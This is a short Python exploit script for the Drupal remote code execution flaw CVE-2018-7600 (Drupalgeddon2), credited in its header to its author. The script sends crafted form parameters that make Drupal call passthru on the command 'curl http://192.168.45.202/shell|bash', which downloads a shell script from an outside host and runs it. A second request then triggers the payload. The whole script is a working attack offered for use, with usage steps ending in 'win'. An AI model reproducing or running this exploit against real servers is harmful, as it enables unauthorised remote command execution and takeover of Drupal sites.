#!/usr/bin/env python3

"""
Written by Christian Mehlmauer
  https://firefart.at/
  https://twitter.com/_FireFart_
  https://github.com/FireFart

This script can be obtained from:
  https://github.com/FireFart/CVE-2018-7600

Requirements:
  - python3
  - python requests (pip install requests)

Usage:
  - Install dependencies
  - modify the HOST variable in the script
  - run the code
  - win
"""

import requests
import re

HOST="http://192.168.225.48:1898/"

get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl http://192.168.45.202/shell|bash', 'name[#type]':'markup'}
post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
r = requests.post(HOST, data=post_params, params=get_params)

m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
if m:
    found = m.group(1)
    get_params = {'q':'file/ajax/name/#value/' + found}
    post_params = {'form_build_id':found}
    r = requests.post(HOST, data=post_params, params=get_params)
    print(r.text)
